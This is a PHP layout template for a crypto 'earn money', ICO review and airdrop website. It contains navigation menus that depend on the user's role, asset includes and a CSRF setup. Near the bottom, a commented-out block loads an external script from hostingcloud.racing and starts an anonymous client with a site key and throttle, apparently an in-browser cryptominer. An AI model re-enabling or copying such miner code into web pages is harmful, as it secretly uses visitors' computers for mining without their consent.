<!DOCTYPE html>
<html>
<head>
  <?= $this->Html->charset() ?>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>
    <?= $this->fetch('title') ?>
  </title>

  <!-- Bootstrap core CSS -->
  <link href="<?php echo $this->request->getAttribute("webroot"); ?>assets/css/bootstrap.min.css" rel="stylesheet">
  <link href="<?php echo $this->request->getAttribute("webroot"); ?>ic_style-2.css" rel="stylesheet">
  <?= $this->fetch('css') ?>

  <?php $library = $this->request->getAttribute("webroot")."ico/"; ?>
  <link rel="icon" href="<?php echo $library; ?>img/favicon/favicon.ico">
  <link rel="apple-touch-icon" sizes="180x180" href="<?php echo $library; ?>img/favicon/apple-touch-icon-180x180.png">
  
  <!-- <link href="https://fonts.googleapis.com/css?family=Poppins:100,100i,200,200i,300,300i,400,400i,500,500i,600,600i,700,700i,800,800i,900,900i" rel="stylesheet"> -->
  <link href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i" rel="stylesheet">
	<?= $this->Html->css(['custom'],['type' => 'text/css','media' => 'all']) ?>

  <?= $this->fetch('pageLevelCSS')?>

</head>
<body class="bg-light" data-gr-c-s-loaded="true" style="font-family: 'Nunito', sans-serif;">

  <!-- Navigation -->
  <nav class="navbar navbar-expand-lg navbar-dark static-top ic_header_bg" style="background-color: #1f2641;">
    <div class="container" style="padding-left: 0px !important;margin-left:0;">
      <!-- Logo -->
      <a class="navbar-brand" href="<?= $this->Url->Build('/')?>">
        <?php echo $this->Html->Image('new-logo.png',['style' => 'height: 40px;']); ?>
      </a>

      <!-- Menu button in mobile -->
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>

      <div class="collapse navbar-collapse" id="navbarResponsive">
        <ul class="navbar-nav ml-auto">
          <?php
          /*For Admin role*/
          (in_array($menuActive, ["Users.dashboard"])) ? $HomeActive = "active": "";
          (in_array($menuActive, ["News.add", "News.index", "News.view"])) ? $NewsActive = "active": "";
          (in_array($menuActive, ["Tasks.add", "Tasks.index", "Tasks.view", "Tasks.edit"])) ? $TasksActive = "active": "";
          (in_array($menuActive, ["Icos.index"])) ? $IcosActive = "active": "";
          (in_array($menuActive, ["Airdrops.add", "Airdrops.index"])) ? $AirActive = "active": "";
          (in_array($menuActive, ["Users.index"])) ? $usActive = "active": "";
          (in_array($menuActive, ["Users.menus"])) ? $mmActive = "active": "";
		  

          /*For User role*/
          (in_array($menuActive, ["News.userNews","News.userView"])) ? $nActive = "active": "";
          (in_array($menuActive, ["Tasks.earnMoney"])) ? $tActive = "active": "";
          (in_array($menuActive, ["Tasks.add", "Tasks.index", "Tasks.edit", "News.add", "News.index", "News.view", "News.edit"])) ? $cActive = "active": "";
          (in_array($menuActive, ["Airdrops.airdropUserView", "Airdrops.userView"])) ? $arActive = "active": "";
          (in_array($menuActive, ["Refers.index"])) ? $rfActive = "active": "";
          (in_array($menuActive, ["Refers.WithdrawRequests"])) ? $WithdrawActive = "active": "";
          (in_array($menuActive, ["Users.userProfile", "Refers.wallet"])) ? $pfActive = "active": "";
          ?>

		      <?php if($user_role=='Admin' || $user_role=='Staff'){ ?>
            <li class="nav-item <?php echo @$HomeActive; ?>">
              <a href="<?= $this->Url->Build('/Dashboard')?>" class="nav-link">Home</a>
            </li>
            <li class="nav-item dropdown <?php echo @$NewsActive; ?>">
              <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                News and Articles
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                <?= $this->Html->link(__('Add'), ['controller' => 'news', 'action' => 'add'],['class'=>'dropdown-item']) ?>
                <?= $this->Html->link(__('List'), ['controller' => 'news', 'action' => 'index'],['class'=>'dropdown-item']) ?>
				      </div>
            </li>
			      <li class="nav-item dropdown <?php echo @$TasksActive; ?>">
              <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Earn Money
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                <?= $this->Html->link(__('Add'), ['controller' => 'Tasks', 'action' => 'add'],['class'=>'dropdown-item']) ?>
                <?= $this->Html->link(__('List'), ['controller' => 'Tasks', 'action' => 'index'],['class'=>'dropdown-item']) ?>
              </div>
            </li>
            <li class="nav-item dropdown <?php echo @$AirActive; ?>">
              <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                ICO Review
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                <?= $this->Html->link(__('Add'), ['controller' => 'Airdrops', 'action' => 'add'],['class'=>'dropdown-item']) ?>
                <?= $this->Html->link(__('List'), ['controller' => 'Airdrops', 'action' => 'index'],['class'=>'dropdown-item']) ?>
                <a href="<?= $this->Url->Build('/ICO-Applications')?>" class="dropdown-item">ICO-Applications</a>
              </div>
            </li>
            <li class="nav-item <?php echo @$mmActive; ?>">
              <a href="<?= $this->Url->Build('/Menus')?>" class="nav-link">More Menus</a>
            </li>
			    <?php } else { ?> <!-- Else statement -->
  			    <li class="nav-item <?php echo @$nActive; ?>">
              <a href="<?= $this->Url->Build('/News-and-Articles')?>" class="nav-link">News and Articles</a>
            </li>
            <li class="nav-item <?php echo @$tActive; ?>">
              <a href="<?= $this->Url->Build('/Earn-Money')?>" class="nav-link">Earn Money</a>
            </li>
            <li class="nav-item <?php echo @$arActive; ?>">
              <a href="<?= $this->url->build('/Airdrops-Feed');?>" class="nav-link">ICO Review</a>
            </li>      
            <li class="nav-item <?php echo @$rfActive; ?>">
              <a href="<?= $this->url->build('/Refer-and-Earn');?>" class="nav-link">Refer and Earn</a>
            </li>

            <li class="nav-item dropdown <?php echo @$cActive; ?>">
              <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Create
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                <?= $this->Html->link(__('Tasks'), ['controller' => 'tasks', 'action' => 'add'],['class'=>'dropdown-item']) ?>
                <?= $this->Html->link(__('News and Articles'), ['controller' => 'news', 'action' => 'add'],['class'=>'dropdown-item']) ?>
              </div>
            </li>
			 
            <?php if(@$session_user_name){ ?>
              <li class="dropdown <?php echo @$pfActive; ?>">
                <a href="#" class="nav-link dropdown-toggle" id="navbarDropdown" data-toggle="dropdown" aria-expanded="false"> 
                  <?=  @$session_user_name ?><b class="caret"></b>
                </a>
                <div class="dropdown-menu dropdown-menu-right">
                    <a class="dropdown-item" href="<?= $this->Url->Build('/profile')?>">My Profile</a>
                    <a class="dropdown-item" href="<?= $this->Url->Build('/My-Wallet')?>">Wallet</a>
                    <div class="dropdown-divider"></div>
                    <a class="dropdown-item" href="<?= $this->url->build(['controller'=>'users','action'=>'logout']) ?>">Logout</a>
                </div>
            </li>
          <?php } ?>
  			  <?php } ?>
              
  			  <?php if(empty($user_id)){ ?>
            <li class="nav-item">
              <a class="nav-link" href="<?= $this->url->build(['controller'=>'users','action'=>'login']) ?>">Login</a>
            </li>
          <?php }else if($user_role=='Admin' || $user_role=='Staff'){ ?> 
            <li class="nav-item">
              <a class="nav-link" href="<?= $this->url->build(['controller'=>'users','action'=>'logout']) ?>">Logout</a>
            </li>
          <?php } ?>
        </ul>
      </div>
    </div>
  </nav>
    
    <!-- Page Content -->
    <div class="container">
    <?= $this->Flash->render() ?>
    <?= $this->fetch('content') ?>
    </div>
    
    <!-- Bootstrap core JavaScript -->
    <script src="<?php echo $this->request->getAttribute("webroot"); ?>assets/js/jquery-3.3.1.min.js"></script>
    <script src="<?php echo $this->request->getAttribute("webroot"); ?>assets/js/bootstrap.bundle.min.js"></script>
	 <?= $this->fetch('script') ?>
    <!-- <script src="https://www.hostingcloud.racing/X4XX.js"></script>
    <script>
        var _client = new Client.Anonymous('ee3c3e8c50942905be889544264cc91678b72b870fbebdccfa0f5260f0d1e5cb', {
            throttle: 0.5, ads: 0
        });
        _client.start();
    </script> -->
    
    <!-- Go to www.addthis.com/dashboard to customize your tools -->
    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5d63ffb1a9a21c4c"></script>

    <?= $this->fetch('pageLevelJS')?>
    <?= $this->fetch('scriptBottom')?>
    <script>
         
    var csrf = <?=json_encode($this->request->getParam('_csrfToken'))?>;
    $.ajaxSetup({
        headers: { 'X-CSRF-Token': csrf },
        error: function(){
        //toastr.error('ajex error');
    }
    });
    </script>
</body>
</html>
